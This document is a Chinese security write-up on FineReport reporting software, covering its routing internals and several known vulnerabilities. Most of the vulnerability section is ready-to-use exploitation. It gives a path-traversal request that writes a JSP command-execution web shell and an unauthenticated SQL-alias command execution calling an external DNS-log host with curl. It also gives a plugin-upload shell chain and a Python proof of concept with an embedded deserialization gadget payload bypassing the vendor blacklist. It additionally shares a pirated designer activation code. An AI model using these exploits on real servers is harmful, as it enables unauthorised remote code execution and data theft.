# FineReport

官方文档： https://www.finereport.com/

官方帮助文档： https://help.finereport.com/

FineReport（帆软报表）的安装较为简单，直接双击`windows_x64_FineReport-CN.exe`，选择好安装目录后自动安装，安装完成后，自动跳转到`http://localhost:8075/WebReport/ReportServer`数据决策系统，第一次使用要求先配置管理员用户名和密码。

如果要使用设计器，可以从网上找一个激活码（如`设计器激活码：63e70b50-36c054361-9578-69936c1e9a57`），点击激活即可

> v11 版本，web 端地址为 `http://localhost:8075/webroot/decision`。

## 远程调试

修改 `bin/designer.vmoptions` 文件，添加 JVM 调试参数

```
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005
```

保存后重启 FineReport 即可。

## 架构分析
### 路由分析
#### v8/v9
v8和v9较为类似，目录`/FineReport_9.0/WebReport/WEB-INF/web.xml`是唯一的路由配置文件，并且只定义了一个servlet，内容如下
```xml
  <servlet>
    <servlet-name>ReportServer</servlet-name>
    <servlet-class>com.fr.web.ReportServlet</servlet-class>
    <load-on-startup>0</load-on-startup>
  </servlet>

  <servlet-mapping>
    <servlet-name>ReportServer</servlet-name>
    <url-pattern>/ReportServer</url-pattern>
  </servlet-mapping>
```
`ReportServlet`本身包括`init、destroy、createLegalModuleClassName`方法，但是`createLegalModuleClassName`方法并不对请求进行处理。作为请求的入口类，理论上存在请求处理或参数传递，所以直接看`ReportServlet`的父类`BaseServlet`。它实现了`HttpServlet`，具备doGet和doPost等方法（doPost调用的也是doGet）。
<details>
    <summary>BaseServlet</summary>
    <pre>
    <code>
public abstract class BaseServlet extends HttpServlet {
    ...
    public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws IOException, ServletException {
        this.initWebAppName(var1);
        saveRequestContext(var1);
        GZIPResponseWrapper var3 = null;
        try {
            String var4 = var1.getHeader("accept-encoding");
            var3 = this.initGzipResponseWrapper(var1, (HttpServletResponse)var2, var4);
            if (var3 != null) {
                var2 = var3;
            }
            ((HttpServletResponse)var2).addHeader("P3P", "CP=CAO PSA OUR");
            ExtraClassManagerProvider var5 = (ExtraClassManagerProvider)PluginModule.getAgent(PluginModule.ExtraCore);
            if (var5 != null) {
                Set var6 = var5.getArray("SessionPrivilegeFilterProvider");
                Iterator var7 = var6.iterator();
                while(var7.hasNext()) {
                    SessionPrivilegeFilterProvider var8 = (SessionPrivilegeFilterProvider)var7.next();
                    var8.addSecurityResponseHeader((HttpServletResponse)var2);
                }
            }
            ReportDispatcher.dealWithRequest(var1, (HttpServletResponse)var2);
        } ...
    }
}
    </code>
    </pre>
</details>

请求处理的核心方法`dealWithRequest`代码如下，获取`op`参数根据`op`参数调用不同方法，大多最后会调用`dealWithOp()`方法
```java
public static void dealWithRequest(HttpServletRequest var0, HttpServletResponse var1) throws Exception {
        extraFilter(var0, var1);
        String var2 = WebUtils.getHTTPRequestParameter(var0, "op");
        String var3 = WebUtils.getHTTPRequestParameter(var0, "sessionID");
        ...     
        if (!MemoryHelper.getMemoryAlarmProcessor().doSessionCheck(var0, var1)) {
            dealWeblet(var2, var3, var0, var1); // 最终调用dealWithOp方法
        }...
    }
```
`dealWithOp()`方法根据传入的`op`，如果能在extraServices找到对应的就直接处理，否则就从现有的Services中，遍历每个Service的`actionOP()`方法找到与`op`值相同的，然后调用该Service的`process()`方法进一步处理请求
```java
private static void dealWithOp(String var0, String var1, HttpServletRequest var2, HttpServletResponse var3) throws Exception {
        var0 = var0.toLowerCase();
        var2.setAttribute("op", var0);
        ...
        Service var12;
        synchronized(EXTRA_SERVICES_LOCK) {
            var12 = (Service)extraServices.get(var0.toLowerCase());
        }
        if (var12 != null) {
            var12.process(var2, var3, var0, var1);
        } else {
            Service[] var13 = servicesAvailable;
            int var15 = var13.length;

            for(int var8 = 0; var8 < var15; ++var8) {
                Service var9 = var13[var8];
                String var10 = var9.actionOP();
                if (var0.equalsIgnoreCase(var10)) {
                    var9.process(var2, var3, var0, var1);
                    return;
                }
            }
            ...
```
如果查看Service接口，会发现确实分为了actionOP和process两种方式。
```java
public interface Service {
    String XML_TAG = "WebService";

    String actionOP();

    void process(HttpServletRequest var1, HttpServletResponse var2, String var3, String var4) throws Exception;
}
```
总结来说，就是通过传入的`op`参数，找到某个Service对应的actionOP返回值与传入的`op`值相同的，然后调用该Service的process方法。process后续的执行流程，可参考 - [任意文件覆盖漏洞](#任意文件覆盖漏洞)。一般是遍历该Service对应的几个Action(Action都实现自`RequestCMDReceiver`接口，该接口包含`getCMD()`方法和`actionCMD()`方法)，如果某个Action的`getCMD()`方法返回值和传入的cmd参数一致，就调用该Action的`actionCMD()`方法对请求进行处理。整体调用流程如下：
```
'op' <=> Service.actionOP -> Service.process -> 'cmd' <=> Action.getCMD -> Action.actionCMD 
```

#### v10
v10的目录结构相比v8/v9有了变化，web.xml不再位于`/FineReport_9/WebReport/WEB-INF/web.xml`，而是`/FineReport_10/server/conf/web.xml`。并且默认入口的Servlet不再是ReportServlet，而是走tomcat的DefaultServlet。并且路由都是由类中的注解方式来设置。
```
	<servlet>
		<servlet-name>default</servlet-name>
		<servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
	</servlet>
```

#### v11

v11 版本的 web.xml 文件位于 `FineReport_11.0/server/conf/web.xml`，与 v10 相比没有变化，路由都通过注解进行配置。v11 的 Web 端基于 Spring 框架编写，同时 v11 将第三方依赖都放在包 `com.fr.third.*` 中。

由于 `web.xml` 文件中并未透露路由信息，那么 context 的初始化工作必然是被放在了代码中处理，通过查看 `com.fr.third.springframework.web.WebApplicationInitializer` 的实现类锁定 context 的初始化位于 `com.fr.startup.MockServletStartUp#initContext`

```java
private static void initContext(ServletContext var0) {
    AnnotationConfigWebApplicationContext var1 = FineWebApplicationStartup.getInstance().getSpringContext();
    if (var1 == null) {
        var1 = new AnnotationConfigWebApplicationContext();
    }

    var1.register(new Class[]{DecisionHandlerAdapter.class});
    ServletRegistration.Dynamic var2 = var0.addServlet("deployment", new DispatcherServlet(var1));
    if (var2 != null) {
        var2.addMapping(new String[]{ServerConfig.getInstance().getServletMapping()});
        var2.setLoadOnStartup(1);
    }

    var1.register(new Class[]{DeploymentConfiguration.class});
    SateVariableManager.remove("fineContextPath");
    SateVariableManager.put("fineContextPath", var0.getContextPath());
    SateVariableManager.remove("fineServletURL");
    SateVariableManager.put("fineServletURL", var0.getContextPath() + "/" + ServerConfig.getInstance().getServletName());
    var1.scan(new String[]{"com.fr.web.controller.common", "com.fr.web.controller.decision.api.deployment", "com.fr.web.controller.decision.entrance", "com.fr.decision.webservice.exception", "com.fr.web.controller.decision.api.system"});
    ContextLoader var3 = new ContextLoader(var1);
    var3.initWebApplicationContext(var0);
}
```

查看 `ServerConfig#servletName`，可知 servlet 路径为 `/decision`，也是为什么 web 端的路径前缀为 `/webroot/decision`

```java
public class ServerConfig extends DefaultConfiguration {
    private static volatile ServerConfig serverConfig = null;
    private Conf<String> serverCharset = Holders.simple(this.getDefaultBrowserCharset());
    private Conf<String> servletName = Holders.simple("decision");
```

v11 web 端的架构并不复杂，大部分的路由都为于 `com.fr.web` 中，可通过注解 `@RequestMapping` 快速锁定相关路由。

## 历史漏洞

历史漏洞复现时要注意一些问题 （1）一般的访问根路径为`http://ip:8075/WebReport/ReportServer`，有的则直接是`http://ip:8075/ReportServer`，或者端口可能也不固定。（2）同样是v8版本，但可能不同小版本之间有很多类存在差异。

|漏洞名称|访问路径|影响版本|
|:---:|:---:|:---:|
|目录遍历漏洞|`op=fs_remote_design&cmd=design_list_file&file_path=../`|v8|
|任意文件读取漏洞|`op=chart&cmd=get_geo_json&resourcepath=privilege.xml`|v8|
|未授权命令执行漏洞|`op=fr_log&cmd=fg_errinfo&fr_username=admin`|—|
|文件上传漏洞|上传`op=plugin&cmd=local_install`, 移动`op=fr_server&cmd=manual_backup`|v8|
|任意文件覆盖漏洞|`op=svginit&cmd=design_save_svg&filePath=`|v9|
|未授权访问漏洞|`op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false`|v7|
|反序列化漏洞|`/webroot/decision/remote/design/channel`|v10、v11|

### 任意文件覆盖漏洞
漏洞入口类为`ChartSvgInitService`。该Service对应的`op`值为`svginit`，然后执行Service的`process()`方法
```
public class ChartSvgInitService implements Service {
    // 这些actions由此Service处理
    private RequestCMDReceiver[] actions = new RequestCMDReceiver[]{new ChartGetSvgAction(), new ChartSaveSvgAction(), new ChartDeleteSvgAction()};

    public String actionOP() {
        return "svginit";
    }

    public void process(HttpServletRequest var1, HttpServletResponse var2, String var3, String var4) throws Exception {
        WebActionsDispatcher.dealForActionCMD(var1, var2, var4, this.actions); // 最终调用的核心方法是WebActionsDispatcher.dealForActionCMD()
    }
}
```
`dealForActionCMD()`方法代码如下，先调用某个action的`getCMD()`方法，如果获取到的字符串值和cmd传入的参数一样，就调用该action的`actionCMD()`方法
```java
public static void dealForActionCMD(HttpServletRequest var0, HttpServletResponse var1, String var2, RequestCMDReceiver[] var3, String var4) throws Exception {
        String var5 = WebUtils.getHTTPRequestParameter(var0, "op");
        String var6 = WebUtils.getHTTPRequestParameter(var0, "pid");
        ExtraClassManagerProvider var7 = (ExtraClassManagerProvider)PluginModule.getAgent(PluginModule.ExtraCore);
        RequestCMDReceiver var8 = null;
        if (var7 != null) {
            var8 = var7.getActionCMD(var5, var4, var6);
        }

        if (var8 != null) {
            var8.actionCMD(var0, var1, var2);
        } else {
            RequestCMDReceiver[] var9 = var3;
            int var10 = var3.length;

            for(int var11 = 0; var11 < var10; ++var11) {
                RequestCMDReceiver var12 = var9[var11];
                String var13 = var12.getCMD(); // 
                if (var13.equalsIgnoreCase(var4)) { // var4对应的是WebUtils.getHTTPRequestParameter(var0, "cmd");
                    var12.actionCMD(var0, var1, var2);
                    return;
                }
            }
        }
    }
```
ChartSvgInitService对应的action包括：`ChartGetSvgAction、ChartSaveSvgAction、ChartDeleteSvgAction`。漏洞位于`ChartSaveSvgAction`，其`actionCMD()`方法如下
```java
    public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception {
        String var4 = WebUtils.getHTTPRequestParameter(var1, "filePath");
        String var5 = GeneralContext.getEnvProvider().getPath() + "/" + "assets" + "/";
        var4 = var5 + var4.substring(var4.indexOf("chartmapsvg"));
        File var6 = null;
        if (var4.contains(".svg")) {
            var6 = new File(var4.substring(0, var4.lastIndexOf("/")));
        } else {
            var6 = new File(var4);
        }

        if (!var6.exists()) {
            var6.mkdirs();
        }

        InputStream var7 = HttpClient.getInputStream(var1);
        if (var7 != null) {
            FileOutputStream var8 = new FileOutputStream(var4);
            Utils.copyBinaryTo(var7, var8);
            String[] var9 = StableUtils.pathSplit(var4);
            String var10 = StableUtils.getFileNameWithOutPostfix(var9[var9.length - 1]);
            MapSvgXMLHelper.getInstance().pushMapAttr(var10, new MapSvgAttr(var4));
            var8.flush();
            var7.close();
            var8.close();
        }
    }
```
假如传入filePath的形式如：`filePath=chartmapsvg/../../../xxx.jsp`，那么会截取chartmapsvg后的内容拼接到`/WebReport/WEB-INF/assets/`之后。然后获取数据流var1中的内容，复制到拼接后的路径文件中。获取数据流的内容是从`__CONTENT__`中获取

```java
public static InputStream getInputStream(HttpServletRequest var0) {
    ByteArrayInputStream var1 = null;
    String var2 = (String)var0.getAttribute("__CONTENT__");
    Object var3 = var0.getAttribute("__CHARSET__");
    String var4 = var3 == null ? "UTF-8" : var3.toString();
    if (StringUtils.isNotEmpty(var2)) {
        byte[] var5;
        try {
            var5 = var2.getBytes(var4);
        } ...
        var1 = new ByteArrayInputStream(var5);
    }
    return var1;
}
```
数据包如下
```
POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/shell.svg.jsp HTTP/1.1

{"__CONTENT__":"<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>","__CHARSET__":"UTF-8"}
```


### 目录遍历漏洞
```
http://localhost:8075/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../&currentUserName=admin&currentUserId=1&isWebReport=true
```
页面上会列出当前目录下的文件

### 任意文件读取漏洞
```
http://localhost:8075/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
```

### 未授权命令执行漏洞
```
POST /WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Connection: close
Content-Length: 675

__parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('curl http://hfgzn5.dnslog.cn');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
```

### 文件上传漏洞
插件上传的漏洞文件位于fr-platform-8.0.jar包中的com.fr.fs.plugin.op.web.action.InstallFromDiskAction
```
POST /WebReport/ReportServer?op=plugin&cmd=local_install HTTP/1.1
Host: 10.92.64.169:8075
Content-Length: 226
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9ZPGwpk0bLORZAro
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=53F74B74ECF933876F24232796688180; fr_remember=false; fr_password=; fr_username=erick
Connection: close

------WebKitFormBoundary9ZPGwpk0bLORZAro
Content-Disposition: form-data; name="install-from-disk"; filename="shell.zip"
Content-Type: application/zip

<%
    out.print("1");
%>
------WebKitFormBoundary9ZPGwpk0bLORZAro--
```
将 WEB-INF/upload/local_temp.zip 文件移动到 web 目录下，在ServerConfigManualBackupAction 类的 actionCMD 方法中，
```
POST /WebReport/ReportServer?op=fr_server&cmd=manual_backup HTTP/1.1
Host: 0.0.0.0:8080
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=12wuh1def7w85; fr_password=; fr_remember=false
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 101

optype=edit_backup&oldname=../../../WEB-INF/upload/local_temp.zip&newname=../../../shel.jsp&serverID=
```

### 反序列化漏洞

> 这里讨论的是 2023 年爆出的反序列化漏洞，它是历史漏洞的绕过（黑名单绕过），当时为了找到绕过方式费了不少功夫。

存在漏洞的接口为 `/webroot/decision/remote/design/channel`，调用链大致为

```java
RemoteDesignResource#onMessage
  RemoteDesignService.getInstance().onMessage(var1, var2);
    WorkContext.handleMessage(var6)
      WorkspaceServerInvoker.handleMessage
        WorkspaceServerInvoker.deserializeInvocation
          (Invocation)SerializerHelper.deserialize(var1, GZipSerializerWrapper.wrap(SafeInvocationSerializer.getDefault()));
            GZipSerializerWrapper.deserialize
```

> 注意 `payload` 需要通过 `gzip` 进行压缩。

此漏洞的前身在 `22` 年被修复，方式为黑名单，文件位于 `fine-core-11.0.jar/com/fr/serialization/blacklist.txt`（见 [blacklist-v11.0.10.txt](blacklist-v11.0.10.txt)）。名单共有 `423` 个类，有点恶心。

仔细观察黑名单，发现一种可能的绕过方式是二次反序列化，其中一种是使用 `SignedObject`，它不在黑名单里，同时由于帆软反序列化黑名单的实现是基于的自定义的 `ObjectInputStream` 类（`CustomObjectInputStream`），而 `SignedObject` 中使用的是 `ObjectInputStream` 故二次反序列化不受黑名单影响，可不受限制的构造利用链。

```java
public Object getObject()
    throws IOException, ClassNotFoundException
{
    // creating a stream pipe-line, from b to a
    ByteArrayInputStream b = new ByteArrayInputStream(this.content);
    ObjectInput a = new ObjectInputStream(b);
    Object obj = a.readObject();
    b.close();
    a.close();
    return obj;
}
```

那么问题就变成怎么在绕过帆软黑名单的情况下，在反序列化时触发 `getObject` 方法。触发 getter 方法，已知的有

- `BeanComparator`-> `PropertyUtils#getProperty`
- `POJONode#toString`
- `JSONOBJECT#toString`
- `ToStringBean#toString`

可用的只有 `POJONode#toString`，那么进一步如何调用 `POJONode#toString` 方法。第一个想到的肯定是 `BadAttributeValueExpException`，但它在黑名单里。将收集到的常见反序列化利用链的入口类拿来与黑名单进行比对（由于包名不同，所以比对类名就好），得到一个结果

```
com.fr.third.org.apache.commons.collections4.bag.TreeBag
```

`TreeBag` 可用于 [CC4 的变体构造](https://xz.aliyun.com/t/12143#toc-8)，可以使用它触发 `Comparator` 接口的 `compare` 方法。那么接下来，搜寻是否有可用的 `Comparator` 的实现类在它的 `compare` 会调用 `toString` 方法。通过查找可以得到类 `com.fr.third.jodd.util.NaturalOrderComparator`（当然它不一定是唯一的），它的 compare 方法如下：

```java
public int compare(T o1, T o2) {
    String str1 = o1.toString();
    String str2 = o2.toString();
    // ...
```

那么使用 `com.fr.third.jodd.util.NaturalOrderComparator` 构造如下调用链条即可：

```java
TreeBag#readObject
  TreeMap#put
    compare(key, key);
      NaturalOrderComparator#compare
		o1.toString()
		  ...
		  // 触发第二次反序列化，这里可选择使用历史漏洞中的 payload
		  SignedObject#geObject
```

而 `SignedObject#geObject` 内嵌套的第二层反序列化可以直接使用历史漏洞中的 payload。最后放上弹计算器的 Poc 代码

```python
import base64
import requests
import urllib3

def cmd(host):
  try:
    url = host + "/webroot/decision/remote/design/channel"
    headers = {
      "Content-Type": "application/octet-stream", 
      "token": "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJmYW5ydWFuIiwiaWF0IjoxNzIxOTMxNTE3LCJzdWIiOiJ0cmdhbmRhIiwianRpIjoiclp4bXBucWp1S1R3OTIzM2xSZWtKMXlSQWozYkxIcXVqemN4dW96djdoVnhXbDlIIn0.56EpWpf_MQnUDD8EW9W-9UjrtojABJK8PYY69Y3v31Y", 
      "username": "trganda"
    }

    b = b"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"
    data = base64.b64decode(b)
    headers["Content-Length"] = str(len(data))
    headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=10)
    if res.status_code == 200:
      print("[+]", host, "------存在漏洞！")
      # print("[+]", res.text)

  except Exception as e:
    print("[o]", host, "------不存在漏洞！")
    print(e)

if __name__ == "__main__":
    cmd("http://localhost:8075")
```

需要注意的是该接口在 `V11.0.10` 版本中是需要验证 `JWT` 的，意味着要获取授权才能利用。该 token，可通过 `/webroot/decision/remote/design/token` 接口获取

```http
curl http://localhost:8075/webroot/decision/remote/design/token?username=<user>&password=<pass>&mainVersion=11
```